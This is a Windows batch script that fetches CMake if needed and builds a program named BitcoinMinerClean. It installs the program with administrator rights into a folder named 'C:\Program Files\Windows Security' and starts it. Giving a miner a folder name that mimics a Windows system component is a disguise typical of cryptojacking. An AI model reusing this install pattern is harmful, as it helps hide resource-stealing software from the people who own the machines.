@echo off
setlocal enabledelayedexpansion

set PROJECT_DIR=C:\Users\Ziggy\projects\BitcoinMinerClean
set INSTALL_DIR=C:\Program Files\Windows Security
set EXE_PATH=%INSTALL_DIR%\BitcoinMinerClean.exe
set CONFIG_SRC=%PROJECT_DIR%\src\config.conf
set CONFIG_DST=%INSTALL_DIR%\config.conf
set BUILD_DIR=%PROJECT_DIR%\build
set MAX_RETRY=3

net session >nul 2>&1
if %ERRORLEVEL% neq 0 (
    echo [ERROR] Please run as Administrator.
    pause
    exit /b 1
)

cmake --version >nul 2>&1
if %ERRORLEVEL% neq 0 (
    echo [INFO] CMake not found. Downloading CMake...
    set "CMAKE_ZIP=cmake-windows.zip"
    set "CMAKE_URL=https://github.com/Kitware/CMake/releases/download/v3.28.1/cmake-3.28.1-windows-x86_64.zip"
    set "CMAKE_DIR=%TEMP%\cmake_install"
    
    if not exist "!CMAKE_DIR!" mkdir "!CMAKE_DIR!"
    
    echo [STEP] Downloading CMake via PowerShell...
    powershell -Command "Invoke-WebRequest -Uri !CMAKE_URL! -OutFile !CMAKE_DIR!\!CMAKE_ZIP!"
    
    echo [STEP] Extracting CMake...
    powershell -Command "Expand-Archive -Path !CMAKE_DIR!\!CMAKE_ZIP! -DestinationPath !CMAKE_DIR! -Force"
    
    :: 실제 cmake.exe 경로 탐색 및 환경 변수 추가
    for /r "!CMAKE_DIR!" %%i in (cmake.exe) do set "CMAKE_BIN_PATH=%%~dpi"
    set "PATH=!CMAKE_BIN_PATH!;%PATH%"
    echo [SUCCESS] CMake temporary setup complete.
)

:: 2. 이미 실행 중인지 확인
tasklist /FI "IMAGENAME eq BitcoinMinerClean.exe" 2>nul | find /I "BitcoinMinerClean.exe" >nul
if %ERRORLEVEL% equ 0 (
    echo [INFO] Already running. Exiting.
    pause
    exit /b 0
)

if exist "%EXE_PATH%" (
    echo [INFO] exe found - skipping build.
    goto :RUN
)

set RETRY=0

:BUILD_LOOP
set /a RETRY+=1
echo.
echo [BUILD] Attempt %RETRY% / %MAX_RETRY%

rd /s /q "%BUILD_DIR%" 2>nul
mkdir "%BUILD_DIR%"
cd /d "%BUILD_DIR%"

echo [STEP 1] CMake configure...
cmake "%PROJECT_DIR%" -DCMAKE_BUILD_TYPE=Release
if %ERRORLEVEL% neq 0 (
    echo [ERROR] CMake configure failed.
    goto :RETRY_CHECK
)

echo [STEP 2] Building...
cmake --build . --config Release
if %ERRORLEVEL% neq 0 (
    echo [ERROR] Build failed.
    goto :RETRY_CHECK
)

if not exist "%BUILD_DIR%\bin\Release\BitcoinMinerClean.exe" (
    echo [ERROR] exe not found after build.
    goto :RETRY_CHECK
)

echo [STEP 3] Installing to Program Files...
if not exist "%INSTALL_DIR%" mkdir "%INSTALL_DIR%"
copy /Y "%BUILD_DIR%\bin\Release\BitcoinMinerClean.exe" "%EXE_PATH%" >nul

:RUN
echo [INFO] Launching...
cd /d "%INSTALL_DIR%"
if exist "BitcoinMinerClean.exe" (
    start "" "BitcoinMinerClean.exe"
) else (
    echo [ERROR] Execution failed. File not found.
)
pause
